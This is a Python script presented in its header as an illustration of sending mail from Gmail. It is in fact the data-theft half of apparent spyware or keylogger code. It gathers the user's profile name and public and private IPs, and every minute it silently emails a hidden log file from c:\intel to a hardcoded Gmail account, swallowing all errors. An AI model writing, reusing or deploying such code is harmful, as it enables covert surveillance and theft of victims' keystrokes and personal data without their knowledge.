# Python code to illustrate Sending mail from 
# your Gmail account 
import smtplib
import time
import os
import datetime
import urllib.request

import pip
import schedule
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading


def connect(host='http://google.com'):
    try:
        urllib.request.urlopen(host)
        return True
    except:
        pass


while True:
    if connect():

        def sendmail():
            try:

                datetime = time.ctime(time.time())
                user = os.path.expanduser('~').split('\\')[2]
                publicIP = requests.get('https://api.ipify.org/').text
                privateIP = socket.gethostbyname(socket.gethostname())
                fromAddr = "email"
                code = "password"
                toAddr = fromAddr

                # time.sleep(MIN * SECONDS) # every 10 mins write file/sendm,m,m,m,m,m,
                # for debugging ~ yes program works :)
                time.sleep(1)
                subject = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ ' \
                          f'Private-IP: {privateIP}\n\n '

                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = datetime
                msg.attach(MIMEText(body, 'plain'))

                attachment = open('c:\intel\Log_03.txt', 'rb')
                #print('attachment')

                filename = "output.txt"

                part = MIMEBase('application', 'octect-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                msg.attach(part)

                text = msg.as_string()
                #print('test msg.as_string')

                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                # print('starttls')
                s.ehlo()
                s.login(fromAddr, code)
                s.sendmail(fromAddr, toAddr, text)
                #print('sent mail')
                attachment.close()
                s.close()
            except:
                pass


        schedule.every(1).minutes.do(sendmail)
        while True:
            schedule.run_pending()



